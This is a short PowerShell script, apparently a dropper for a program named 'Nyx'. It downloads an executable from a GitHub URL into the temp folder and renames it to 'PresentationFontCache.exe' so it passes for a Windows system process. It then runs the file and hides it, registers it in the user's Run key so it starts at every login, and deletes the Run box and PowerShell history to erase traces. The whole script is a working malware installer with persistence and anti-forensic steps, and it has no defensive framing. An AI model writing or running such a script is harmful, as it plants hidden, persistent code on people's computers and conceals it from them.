# Nyx - 59258W3K

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/59258W3K/Nyx.exe -OutFile "$env:TEMP\Nyx.exe"

# Change Nyx Name
Rename-Item -Path "$env:TEMP\Nyx.exe" -NewName "PresentationFontCache.exe"

# Run Nyx
& "$env:TEMP\PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:TEMP\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "Nyx" `
-Value "$env:TEMP\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
